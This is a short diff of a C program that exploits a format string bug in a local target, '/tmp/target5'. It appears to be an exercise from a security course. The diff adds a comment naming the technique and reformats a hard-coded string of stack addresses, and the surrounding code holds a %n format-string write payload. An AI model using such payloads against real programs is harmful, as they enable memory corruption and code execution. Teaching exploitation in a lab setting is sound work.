@@ -7,12 +7,17 @@
 #define TARGET "/tmp/target5"
 #define EGG_SIZE 400 
 
+/* 
+ * Main idea of exploit:
+ *     This is a format string exploit. 
+ */
+
 int main(void)
 {
   char *args[3];
   char *env[1];
   char egg[EGG_SIZE];
-  char *dummyAddrPair = "\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
+  char *dummyAddrPair = "\xFF\xFF\xFF\xFF\xCC\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCD\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCE\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCF\xFD\xFF\xBF";
   char *writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";
 
   memset (egg, 0, sizeof (egg));  
